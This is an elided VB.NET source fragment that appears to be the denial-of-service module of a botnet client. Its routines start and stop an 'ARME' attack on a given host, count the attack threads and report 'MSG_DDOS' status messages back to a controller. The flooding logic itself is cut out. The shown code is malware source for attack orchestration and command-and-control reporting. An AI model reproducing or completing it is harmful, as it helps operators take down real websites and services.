...
Public Module AR
    ...
    Public Sub StartARME(ByVal Host As String, ByVal Threadsto As Integer, ByVal Time As Integer, ByVal data As String)
        If Not AttackRunning = True Then
            ...
            If HostToAttack.Contains("https://") Then HostToAttack = HostToAttack.Replace("https://", String.Empty)
            ...
            Main.Send("MSG_DDOS" + Main.SPL & "ARME Attack on " & HostToAttack & " started!")
    ...
    Private Sub lol()
        ...
        If ThreadsEnded = ThreadstoUse Then
            ...
            ThreadstoUse = 0
            AttackRunning = False
            Main.Send("MSG_DDOS" + Main.SPL & "ARME Attack on " & HostToAttack & " finished successfully. Attacks Sent: " & Attacks.ToString)
            Attacks = 0
        End If
    ...
    Public Sub StopARME()
        If AttackRunning = True Then
            ...
            Main.Send("MSG_DDOS" + Main.SPL & "ARME Attack on " & HostToAttack & " aborted successfully. Attacks Sent: " & Attacks.ToString)
            Attacks = 0
